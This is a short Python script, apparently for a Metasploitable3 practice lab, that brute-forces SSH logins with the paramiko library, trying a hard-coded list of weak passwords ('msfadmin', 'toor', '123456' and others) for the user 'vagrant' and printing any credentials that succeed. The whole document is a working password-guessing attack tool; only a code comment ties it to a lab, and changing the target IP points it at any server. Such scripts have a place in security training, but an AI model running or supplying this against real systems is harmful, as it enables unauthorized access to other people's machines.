import paramiko
import socket

target_ip = "192.168.56.101"  # <-- Change this to your Metasploitable3 IP
target_port = 22
username = "vagrant"          # Known weak username
password_list = ["msfadmin", "toor", "123456","vagrant", "root", "password"]  # Example weak passwords

def ssh_connect(username, password, ip, port):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, port=port, username=username, password=password, timeout=5)
        print(f"[+] Success! Username: {username} Password: {password}")
        return True
    except paramiko.AuthenticationException:
        print(f"[-] Failed login with {username}:{password}")
        return False
    except socket.error as e:
        print(f"[!] Connection error: {e}")
        return False
    finally:
        client.close()

for password in password_list:
    if ssh_connect(username, password, target_ip, target_port):
        break